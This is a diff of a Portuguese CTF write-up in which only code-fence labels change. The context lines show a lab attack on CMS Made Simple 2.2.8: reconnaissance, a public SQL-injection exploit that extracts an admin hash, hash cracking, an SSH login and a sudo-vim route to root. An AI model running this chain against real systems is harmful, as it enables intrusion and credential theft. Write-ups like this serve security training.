@@ -19,7 +19,7 @@ Varredura inicial de portas com Nmap:
 nmap -sV <IP>
 ```
 
-```bash
+```text
 PORT     STATE SERVICE VERSION
 21/tcp   open  ftp     vsftpd 3.0.3
 80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
@@ -38,14 +38,14 @@ Brute-force de diretórios com Gobuster:
 gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
 ```
 
-```bash
+```text
 robots.txt   (Status: 200)
 simple       (Status: 301) [--> http://<IP>/simple/]
 ```
 
 Acessando `/simple/`, a aplicação se revelou um **CMS Made Simple**, confirmado pela string presente no HTML da página:
 
-```bash
+```text
 CMS Made Simple version 2.2.8
 ```
 
@@ -70,7 +70,7 @@ python3 46635.py -u http://<IP>/simple/
 
 O exploit extraiu, via SQLi cega baseada em tempo (`sleep()`), o usuário administrador e seu hash de senha:
 
-```bash
+```text
 Username: mitch
 Email: admin@admin.com
 Salt: 1dac0d92e9fa6bb2
@@ -84,7 +84,7 @@ echo '0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2' > hash.txt
 hashcat -m 20 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
-```bash
+```text
 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2:REDACTED
 ```
 
@@ -96,7 +96,7 @@ ssh -p 2222 mitch@<IP>
 
 Dentro da máquina, `sudo -l` revelou o vetor de escalada de privilégio:
 
-```bash
+```text
 User mitch may run the following commands on Machine:
     (root) NOPASSWD: /usr/bin/vim
 ```
